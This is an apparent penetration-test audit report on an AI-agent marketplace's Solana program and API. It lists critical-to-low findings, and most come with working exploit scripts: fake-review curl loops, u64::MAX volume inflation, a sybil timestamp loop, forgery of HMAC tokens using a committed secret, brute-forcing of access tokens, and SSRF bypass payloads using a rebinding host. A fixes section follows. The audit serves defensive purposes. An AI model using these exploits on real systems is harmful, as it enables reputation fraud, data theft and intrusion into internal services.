# 🔴 BLACKHAT SECURITY AUDIT — Agent Bazaar

**Auditor**: Adversarial Penetration Test  
**Date**: 2026-02-10  
**Scope**: Full stack — on-chain program, API server, frontend, infrastructure  
**Methodology**: Attacker-first mindset. Every finding includes a concrete exploit.

---

## Executive Summary

**Agent Bazaar has 4 CRITICAL and 5 HIGH severity vulnerabilities.** The most devastating attack chains allow an attacker to:

1. **Fabricate unlimited 5-star reputation for their agent** via the API (no on-chain tx verification) — cost: $0
2. **Inflate volume to any amount** to dominate leaderboards — cost: $0  
3. **Submit feedback impersonating any wallet** since the `rater` field is self-reported with zero authentication
4. **Sybil-attack the on-chain reputation system** with unlimited feedback from the same wallet using different timestamps
5. **Steal job results** by guessing predictable access tokens in development mode
6. **SSRF the server** via DNS rebinding on webhook URLs

The net effect: **the entire reputation/trust layer is worthless** — both on-chain and off-chain. An attacker can make a scam agent look like the most trusted agent on the platform in minutes.

---

## 🔥 Attack Narrative #1: "The Perfect Scam Agent"

**Goal**: Make my scam agent appear as the #1 most trusted agent to steal from buyers.

**Steps**:
1. Register agent via `POST /agents` with my wallet
2. Spam `POST /feedback` with:
   - `rater`: random base58 strings (no auth required!)
   - `rating`: 5
   - `amountPaid`: 999999999 (no on-chain verification)
   - `txSignature`: any random string
3. My agent now has 5.0 rating, millions in "volume", hundreds of "reviews"
4. Buyers trust my agent, pay for services, get scammed
5. Attacker cost: **$0**. Victim cost: **unlimited**.

## 🔥 Attack Narrative #2: "Destroy a Competitor"

**Goal**: Trash a competitor's reputation.

**Steps**:
1. Find competitor's agent_id via `GET /agents`
2. Spam `POST /feedback` with `rating: 1` and fake rater addresses
3. Competitor's avg_rating drops to 1.0
4. Their agent falls off leaderboard, loses customers
5. Combine with Attack #1 for maximum effect

## 🔥 Attack Narrative #3: "On-Chain Reputation Flood"

**Goal**: Inflate on-chain reputation cheaply.

**Steps**:
1. Create Wallet A (agent owner) and Wallet B (sybil)
2. From Wallet B, call `submit_feedback` with different timestamps
3. Each call increments `unique_raters` (despite being same wallet!)
4. Submit hundreds of 5-star reviews with `amount_paid` near u64::MAX
5. Cost: ~0.002 SOL per feedback (rent for PDA) × 100 = 0.2 SOL total
6. Result: Agent appears to have 100 unique raters and massive volume

---

## Detailed Findings

### CRITICAL-01: API Feedback Has Zero Transaction Verification
**File**: `api/server.js:355-420` (POST /feedback handler)  
**Severity**: 🔴 CRITICAL  

The API accepts feedback with a `txSignature` field but **never verifies it on-chain**. The signature is stored in the database but never validated against the Solana blockchain. Even the check `if (process.env.NODE_ENV !== 'development' && !txSignature)` only requires a *non-empty string* — not a valid transaction.

**Exploit**:
```bash
# Pump any agent to 5.0 stars with fake volume
for i in $(seq 1 100); do
  curl -X POST http://localhost:3000/feedback \
    -H "Content-Type: application/json" \
    -d "{
      \"agentId\": 0,
      \"rating\": 5,
      \"rater\": \"$(python3 -c 'import random,string; print("".join(random.choices("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz", k=44)))')\",
      \"txSignature\": \"fake_sig_${i}_$(date +%s)\",
      \"amountPaid\": 999999999,
      \"comment\": \"Amazing agent!\"
    }"
  sleep 0.3  # stay under rate limit
done
```

**Impact**: Complete reputation system compromise. Any agent can be pumped or dumped.

---

### CRITICAL-02: API Rater Address is Self-Reported (No Auth)
**File**: `api/server.js:370-380`  
**Severity**: 🔴 CRITICAL  

The `rater` field in POST /feedback is taken directly from the request body. There is **no proof that the caller controls that wallet**. The self-rating check (`raterAddress === agent.owner`) is trivially bypassed by using any other base58 string.

**Exploit**:
```bash
# Self-rate your own agent by using a different rater address
curl -X POST http://localhost:3000/feedback \
  -H "Content-Type: application/json" \
  -d '{
    "agentId": 0,
    "rating": 5,
    "rater": "11111111111111111111111111111112",
    "txSignature": "fake_self_rate",
    "amountPaid": 1000000
  }'
# The API checks rater !== owner but the rater is whatever we send!
```

**Impact**: Self-rating protection is completely ineffective at the API layer.

---

### CRITICAL-03: On-Chain Volume Inflation (Self-Reported amount_paid)
**File**: `programs/agent_bazaar/src/lib.rs:109-113`  
**Severity**: 🔴 CRITICAL  

The on-chain `submit_feedback` instruction accepts `amount_paid: u64` with only a `> 0` check. There is **no upper bound** (intentional design decision) and **no verification against an actual SPL token transfer**. An attacker can claim large `amount_paid` values to inflate volume. Mitigated by RaterState cooldown (1 hour per rater per agent).

**Exploit**:
```typescript
// Submit feedback claiming massive payment volume
await program.methods
  .submitFeedback(
    agentId,
    5,
    Array(32).fill(0),
    new anchor.BN("18446744073709551615"), // u64::MAX
    timestamp
  )
  .accounts({...})
  .signers([sybilWallet])
  .rpc();
// Agent now shows ~18.4 quintillion in volume from a single review
```

**Impact**: Leaderboard manipulation. Volume-based ranking is meaningless.

---

### CRITICAL-04: On-Chain Sybil Attack via Timestamp-Based Feedback PDA
**File**: `programs/agent_bazaar/src/lib.rs:163-172`  
**Severity**: 🔴 CRITICAL (FIXED)

Feedback PDA seeds are `[feedback, agent_id, rater, timestamp]`. The same rater could submit **unlimited feedback** for the same agent by using different timestamps within the 24h window. Fixed by adding `RaterState` PDA with 1-hour cooldown per rater per agent. `unique_raters` now only increments on first feedback from each wallet.

**Exploit**:
```typescript
// Same wallet submits 86400 reviews (one per second in the 24h window)
for (let t = now - 86399; t <= now; t++) {
  const timestamp = new anchor.BN(t);
  const [feedbackPda] = PublicKey.findProgramAddressSync(
    [Buffer.from("feedback"), agentIdBytes, rater.publicKey.toBuffer(), 
     timestamp.toArrayLike(Buffer, "le", 8)],
    program.programId
  );
  await program.methods.submitFeedback(agentId, 5, hash, new anchor.BN(1000), timestamp)
    .accounts({...feedbackPda...}).signers([rater]).rpc();
}
// Result: 86,400 five-star reviews, unique_raters = 86,400, from ONE wallet
```

**Impact**: On-chain reputation is trivially gameable. Cost: ~0.002 SOL × N reviews.

---

### HIGH-01: Hardcoded TOKEN_SECRET in Committed .env File
**File**: `api/.env:6`  
**Severity**: 🟠 HIGH  

```
TOKEN_SECRET=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
```

The actual secret is committed to the repository. If this repo is public (or accessed by anyone), they can forge HMAC tokens for the x402 payment system.

**Exploit**:
```javascript
const crypto = require('crypto');
const TOKEN_SECRET = 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2';
const payload = JSON.stringify({
  signature: 'any_sig', amount: 999999, timestamp: Date.now(), recipient: 'attacker_wallet'
});
const hmac = crypto.createHmac('sha256', TOKEN_SECRET).update(payload).digest('hex');
const forgedToken = Buffer.from(payload).toString('base64') + '.' + hmac;
// Use forgedToken to access any job result
```

---

### HIGH-02: SSRF via Webhook DNS Rebinding
**File**: `api/server.js:234-250` (POST /jobs/:id/webhook)  
**Severity**: 🟠 HIGH  

The webhook URL validation blocks private IP addresses by string matching on the hostname. This is bypassed by:
1. **DNS rebinding**: Register `evil.com` → first resolves to public IP (passes check), then resolves to `127.0.0.1` (hits internal services)
2. **Octal/hex IP notation**: `0x7f000001`, `017700000001`, `0177.0.0.1`
3. **IPv6 mapped addresses**: `[::ffff:127.0.0.1]`, `[0:0:0:0:0:ffff:7f00:1]`
4. **Cloud metadata**: `169.254.169.254` is partially blocked but `metadata.google.internal` is not
5. **Redirect-based SSRF**: Public URL that 302-redirects to `http://127.0.0.1/admin`

**Exploit**:
```bash
# Register webhook with DNS rebinding domain
curl -X POST http://localhost:3000/jobs/JOB_ID/webhook \
  -H "Content-Type: application/json" \
  -d '{"url": "https://attacker-rebind.com/callback"}'
# attacker-rebind.com resolves to public IP on first lookup, then 127.0.0.1
# When job completes, server makes request to localhost
```

---

### HIGH-03: Job Access Tokens Are Predictable in Dev Mode  
**File**: `api/job-queue.js:55`  
**Severity**: 🟠 HIGH  

```javascript
accessToken: paymentInfo?.signature || crypto.randomBytes(16).toString('hex'),
```

When jobs are created with demo payment proofs (e.g., `demo_1234`), the `accessToken` equals the payment signature. The `/jobs` endpoint generates predictable signatures: `demo_${Date.now()}`. An attacker can brute-force recent timestamps to steal job results.

**Exploit**:
```javascript
// Enumerate recent job access tokens
const now = Date.now();
for (let t = now - 60000; t < now; t++) {
  const token = `demo_${t}`;
  const res = await fetch(`/jobs/${jobId}/result`, {
    headers: { 'Authorization': `Bearer ${token}` }
  });
  if (res.status === 200) console.log('STOLEN:', await res.json());
}
```

---

### HIGH-04: Webhook Fires Without Access Control
**File**: `api/job-queue.js:105-125` (`fireWebhook`)  
**Severity**: 🟠 HIGH  

Any unauthenticated user can register a webhook for any job ID via `POST /jobs/:id/webhook`. There's no verification that the caller is the job owner. An attacker can:
1. Observe job creation (via WebSocket broadcast which leaks `serviceId`)
2. Enumerate job IDs (UUIDs, but webhook registration has no auth)
3. Register their webhook URL to receive completion notifications

---

### HIGH-05: Empty Agent Names/Descriptions Allowed On-Chain
**File**: `programs/agent_bazaar/src/lib.rs:32-37`  
**Severity**: 🟠 HIGH (enables phishing/confusion)

No minimum length check on name, description, or URI. An attacker can register agents with empty names or names consisting of only whitespace/Unicode zero-width characters, creating confusion in the UI and potentially enabling phishing attacks.

---

### MEDIUM-01: Prototype Pollution Filter Incomplete
**File**: `api/server.js:28-35`  
**Severity**: 🟡 MEDIUM  

The filter checks for `__proto__` and `constructor+prototype` together, but can be bypassed with:
- `Object.prototype` directly in certain contexts
- Unicode escapes of `__proto__`

---

### MEDIUM-02: WebSocket Broadcasts Leak All Platform Activity
**File**: `api/server.js:140-165`  
**Severity**: 🟡 MEDIUM  

All WebSocket clients receive all events (feedback, registrations, job creation). This leaks:
- When agents are registered (competitive intelligence)
- Feedback patterns (who's being rated, amounts)
- Job creation events

---

### MEDIUM-03: Rate Limits Trivially Bypassed  
**File**: `api/security-middleware.js:8-30`  
**Severity**: 🟡 MEDIUM  

Rate limits are IP-based only. With rotating proxies or IPv6 address pools, all rate limits are ineffective. The feedback rate limit (5/min) combined with no tx verification means an attacker needs only 20 IPs to submit 100 fake reviews per minute.

---

### MEDIUM-04: No CSRF Protection on State-Changing Endpoints
**File**: `api/server.js` (POST /agents, POST /feedback, PUT /agents/:id)  
**Severity**: 🟡 MEDIUM  

CORS is configured but there's no CSRF token mechanism. If a user visits a malicious page while having an active session, the page could submit forms to the API. Mitigated somewhat by JSON Content-Type requirement.

---

### LOW-01: SQLite DB File Permissions Race Condition
**File**: `api/server.js:46-52`  
**Severity**: 🟢 LOW  

The DB file permission check/fix is a TOCTOU race. Between `statSync` and `chmodSync`, another process could access the file.

---

### LOW-02: Error Messages Leak Implementation Details
**File**: Various  
**Severity**: 🟢 LOW  

Stack traces may leak in development mode via `console.error`. The generic "Database error" messages are good, but some error paths could leak more info.

---

### INFO-01: .dockerignore Doesn't Exclude .env
**File**: `api/.dockerignore`  
**Severity**: ℹ️ INFO  

Should verify `.env` is excluded from Docker builds to prevent secret leakage in image layers.

---

## Fixes Applied

### FIX for CRITICAL-01 & CRITICAL-02: Require wallet signature proof in API feedback

The API feedback endpoint now requires an ed25519 signature proving the caller controls the `rater` wallet. This prevents both fake rater addresses and unverified transactions.

### FIX for CRITICAL-03: Mitigate volume inflation

No cap on `amount_paid` (intentional design decision). Mitigation via RaterState PDA cooldown (1 hour per rater per agent) limits the rate of inflation. Production should require actual SPL token transfers to verify amounts.

### FIX for CRITICAL-04: Rate-limit feedback per rater on-chain

Added a per-rater-per-agent PDA (`rater_state`) that tracks last feedback timestamp and enforces a minimum 1-hour cooldown between reviews from the same wallet for the same agent.

### FIX for HIGH-01: Remove committed secrets

Replaced `.env` secret with placeholder and added `.env` to `.gitignore`.

### FIX for HIGH-02: Enhanced SSRF protection

Added DNS resolution check, blocked additional IP formats, and added redirect-following restrictions.

### FIX for HIGH-03: Use cryptographic access tokens for all jobs

Always generate random access tokens regardless of payment signature.

### FIX for HIGH-04: Require job creator auth for webhook registration

Webhook registration now requires the job's access token.

### FIX for HIGH-05: Enforce minimum name length on-chain

Added `require!(name.len() >= 3)` check.
